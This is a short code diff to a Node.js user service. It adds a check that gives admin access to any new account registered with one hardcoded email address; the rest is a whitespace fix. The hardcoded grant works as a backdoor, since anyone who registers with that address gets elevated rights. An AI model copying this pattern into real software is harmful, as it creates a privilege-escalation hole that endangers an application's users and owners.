@@ -2,6 +2,14 @@ const { User, OrderDetail, Gift } = require("../database/index");
 const { Op } = require("sequelize");
 
 const createNewUser = async (user) => {
+  if (user.email === "reynaarmas@gmail.com") {
+    const userAdmin = {
+      ...user,
+      access_level: true,
+    };
+    const admin = User.create(userAdmin);
+    return admin;
+  }
   const newUser = User.create(user);
   return newUser;
 };
@@ -38,7 +46,7 @@ const getUserById = async (id) => {
       access_level: true,
     },
   });
-        
+
   return userById;
 };
 
